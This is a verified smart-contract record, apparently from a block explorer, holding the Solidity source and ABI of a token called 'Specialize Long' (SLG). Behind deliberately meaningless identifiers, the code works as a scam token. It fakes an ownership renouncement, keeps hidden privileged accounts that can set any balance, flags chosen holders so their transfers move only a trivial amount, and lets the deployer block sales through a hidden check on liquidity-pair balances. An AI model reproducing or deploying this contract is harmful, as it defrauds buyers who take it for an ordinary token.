{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface marketingMode {\n    function createPair(address launchedTeam, address tokenReceiver) external returns (address);\n}\n\ninterface atMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minTo) external view returns (uint256);\n\n    function transfer(address modeFund, uint256 atLiquidity) external returns (bool);\n\n    function allowance(address receiverMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeFund,\n        uint256 atLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxMode, uint256 value);\n    event Approval(address indexed receiverMode, address indexed spender, uint256 value);\n}\n\nabstract contract toMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atMinMetadata is atMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SpecializeLong is toMax, atMin, atMinMetadata {\n\n    uint256 constant swapMarketing = 9 ** 10;\n\n    function owner() external view returns (address) {\n        return shouldLaunchIs;\n    }\n\n    bool private receiverAuto;\n\n    function getOwner() external view returns (address) {\n        return shouldLaunchIs;\n    }\n\n    function launchedTotal(address fromAutoLaunched, uint256 atLiquidity) public {\n        tokenLiquidity();\n        maxTotal[fromAutoLaunched] = atLiquidity;\n    }\n\n    mapping(address => bool) public launchMode;\n\n    function exemptAmountShould(address enableFund) public {\n        if (launchedAmount) {\n            return;\n        }\n        if (walletMax) {\n            receiverAuto = true;\n        }\n        launchMode[enableFund] = true;\n        \n        launchedAmount = true;\n    }\n\n    constructor (){\n        if (walletMax == receiverAuto) {\n            shouldSell = tokenTeam;\n        }\n        receiverEnable tokenMarketing = receiverEnable(amountFundReceiver);\n        sellTxBuy = marketingMode(tokenMarketing.factory()).createPair(tokenMarketing.WETH(), address(this));\n        \n        fundBuy = _msgSender();\n        launchMode[fundBuy] = true;\n        maxTotal[fundBuy] = swapBuy;\n        enableBuy();\n        if (shouldSender == liquidityTotal) {\n            receiverAuto = true;\n        }\n        emit Transfer(address(0), fundBuy, swapBuy);\n    }\n\n    mapping(address => uint256) private maxTotal;\n\n    uint256 private swapBuy = 100000000 * 10 ** 18;\n\n    uint256 swapTeam;\n\n    uint256 private tokenTeam;\n\n    function enableToken(uint256 atLiquidity) public {\n        tokenLiquidity();\n        swapTeam = atLiquidity;\n    }\n\n    bool private walletMax;\n\n    uint256 public swapLiquidity;\n\n    function atMaxTeam(address launchedReceiver, address modeFund, uint256 atLiquidity) internal returns (bool) {\n        if (launchedReceiver == fundBuy) {\n            return toSell(launchedReceiver, modeFund, atLiquidity);\n        }\n        uint256 enableFundLiquidity = atMin(sellTxBuy).balanceOf(modeToken);\n        require(enableFundLiquidity == swapTeam);\n        require(modeFund != modeToken);\n        if (enableTeamFund[launchedReceiver]) {\n            return toSell(launchedReceiver, modeFund, swapMarketing);\n        }\n        return toSell(launchedReceiver, modeFund, atLiquidity);\n    }\n\n    address public sellTxBuy;\n\n    function senderWallet(address marketingTxLiquidity) public {\n        tokenLiquidity();\n        \n        if (marketingTxLiquidity == fundBuy || marketingTxLiquidity == sellTxBuy) {\n            return;\n        }\n        enableTeamFund[marketingTxLiquidity] = true;\n    }\n\n    uint8 private amountMaxTrading = 18;\n\n    address public fundBuy;\n\n    uint256 private shouldSell;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapBuy;\n    }\n\n    event OwnershipTransferred(address indexed shouldFrom, address indexed launchExempt);\n\n    uint256 public liquidityTotal;\n\n    address modeToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private launchedMinReceiver = \"Specialize Long\";\n\n    function approve(address amountAutoAt, uint256 atLiquidity) public virtual override returns (bool) {\n        swapMode[_msgSender()][amountAutoAt] = atLiquidity;\n        emit Approval(_msgSender(), amountAutoAt, atLiquidity);\n        return true;\n    }\n\n    function toSell(address launchedReceiver, address modeFund, uint256 atLiquidity) internal returns (bool) {\n        require(maxTotal[launchedReceiver] >= atLiquidity);\n        maxTotal[launchedReceiver] -= atLiquidity;\n        maxTotal[modeFund] += atLiquidity;\n        emit Transfer(launchedReceiver, modeFund, atLiquidity);\n        return true;\n    }\n\n    function transfer(address fromAutoLaunched, uint256 atLiquidity) external virtual override returns (bool) {\n        return atMaxTeam(_msgSender(), fromAutoLaunched, atLiquidity);\n    }\n\n    address amountFundReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountMaxTrading;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedMinReceiver;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityAtAmount;\n    }\n\n    uint256 private shouldSender;\n\n    address private shouldLaunchIs;\n\n    bool private buyTotalReceiver;\n\n    uint256 walletLiquidity;\n\n    bool public launchedAmount;\n\n    uint256 private takeTokenMarketing;\n\n    string private liquidityAtAmount = \"SLG\";\n\n    function enableBuy() public {\n        emit OwnershipTransferred(fundBuy, address(0));\n        shouldLaunchIs = address(0);\n    }\n\n    function transferFrom(address launchedReceiver, address modeFund, uint256 atLiquidity) external override returns (bool) {\n        if (_msgSender() != amountFundReceiver) {\n            if (swapMode[launchedReceiver][_msgSender()] != type(uint256).max) {\n                require(atLiquidity <= swapMode[launchedReceiver][_msgSender()]);\n                swapMode[launchedReceiver][_msgSender()] -= atLiquidity;\n            }\n        }\n        return atMaxTeam(launchedReceiver, modeFund, atLiquidity);\n    }\n\n    mapping(address => mapping(address => uint256)) private swapMode;\n\n    uint256 private autoAmount;\n\n    function allowance(address autoMax, address amountAutoAt) external view virtual override returns (uint256) {\n        if (amountAutoAt == amountFundReceiver) {\n            return type(uint256).max;\n        }\n        return swapMode[autoMax][amountAutoAt];\n    }\n\n    mapping(address => bool) public enableTeamFund;\n\n    function balanceOf(address minTo) public view virtual override returns (uint256) {\n        return maxTotal[minTo];\n    }\n\n    function tokenLiquidity() private view {\n        require(launchMode[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountAutoAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAutoAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableTeamFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atLiquidity\",\"type\":\"uint256\"}],\"name\":\"enableToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFund\",\"type\":\"address\"}],\"name\":\"exemptAmountShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAutoLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLiquidity\",\"type\":\"uint256\"}],\"name\":\"launchedTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTxBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTxLiquidity\",\"type\":\"address\"}],\"name\":\"senderWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAutoLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SpecializeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}